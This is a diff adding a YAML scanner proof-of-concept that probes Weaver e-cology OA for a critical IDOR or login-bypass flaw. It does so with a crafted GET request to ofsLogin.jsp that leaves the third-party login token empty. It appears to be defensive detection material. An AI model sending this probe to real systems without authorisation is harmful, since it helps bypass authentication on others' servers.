@@ -1,0 +1,19 @@
+name: yaml-poc-weaver-weaver_e_cology_oa-idor-CT-727311
+binding: cc699491-ec20-4ac3-8e28-2e2a03993e1a
+detail:
+    author: yuxiang.cai
+    links:
+        - https://www.weaver.com.cn/cs/securityDownload.html?src=cn
+    vulnerability:
+        id: d6e190e7-a049-4b88-9057-b7fdf0dd73a3
+        level: critical
+    warning: Harmless
+transport: http
+rules:
+    kw_in_body:
+        request:
+            cache: true
+            method: GET
+            path: /mobile/plugin/1/ofsLogin.jsp?syscode=syscode&timestamp=2&gopage=3&receiver=test&loginTokenFromThird=
+        expression: response.body_string.contains("/login/Login.jsp") && response.body_string.contains('location.replace') && response.status == 200
+expression: kw_in_body()
